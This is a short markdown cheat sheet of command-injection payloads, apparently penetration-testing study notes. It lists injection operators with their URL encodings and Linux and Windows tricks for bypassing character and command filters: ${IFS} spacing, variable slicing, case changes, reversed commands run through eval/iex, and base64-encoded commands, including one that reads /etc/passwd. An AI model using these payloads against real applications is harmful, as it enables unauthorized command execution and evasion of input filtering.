# Command Injections

## 1. Injection Operators

### Semicolon

```bash
;        %3b
```

### New Line

```bash
\n       %0a
```

### Background

```bash
&        %26
```

### Pipe

```bash
|        %7c
```

### AND Operator

```bash
&&       %26%26
```

### OR Operator

```bash
||       %7c%7c
```

### Sub-Shell (Linux only)

```bash
` `      %60%60
$()      %24%28%29
```

---

## 2. Linux - Filtered Character Bypass

### View Environment Variables

```bash
printenv
```

### Space Bypasses

```bash
%09
${IFS}
{ls,-la}
```

### Other Character Bypasses

```bash
${PATH:0:1}
${LS_COLORS:10:1}
$(tr '!-}' '"-~'<<<[)
```

### Blacklisted Command Bypass

#### Character Insertion

```bash
'  
"
$@
\
```

#### Case Manipulation

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
```

#### Reversed Commands

```bash
echo 'whoami' | rev
eval $(rev<<<'imaohw')
```

#### Encoded Commands

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

---

## 3. Windows - Filtered Character Bypass

### View Environment Variables

```powershell
Get-ChildItem Env:
```

### Space Bypasses

```powershell
%09
%PROGRAMFILES:~10,-5%
$env:PROGRAMFILES[10]
```

### Other Character Bypasses

```powershell
%HOMEPATH:~0,-17%
$env:HOMEPATH[0]
```

### Blacklisted Command Bypass

#### Character Insertion

```powershell
'
"
^
```

### Case Manipulation

```powershell
WhoAmi
```

### Reversed Commands

```powershell
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"
```

### Encoded Commands

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
